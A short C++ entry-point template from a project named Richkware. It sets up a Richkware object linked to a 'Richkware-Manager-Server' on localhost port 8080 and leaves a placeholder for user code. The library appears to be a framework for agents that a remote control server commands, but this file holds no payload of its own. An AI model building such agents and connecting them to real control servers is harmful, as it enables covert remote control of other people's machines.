/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*      Created by bladez on 13/06/19.
*/
#include <iostream>

#include "src/richkware.h"
#include "src/utils.h"


int main() {
    const char *appName = "Richk";
    RmsInfo rmsInfo(
            "richktest",
            "127.0.0.1",
            "8080",
            "Richkware-Manager-Server",
            "richk@i.it"
            );

    // with RichkwareManagerServer
    Richkware richkware(appName, rmsInfo);
    // without RichkwareManagerServer
    //Richkware richkware(appName, defaultEncryptionKey);

    // PUT YOUR CODE HERE

    return 0;
}


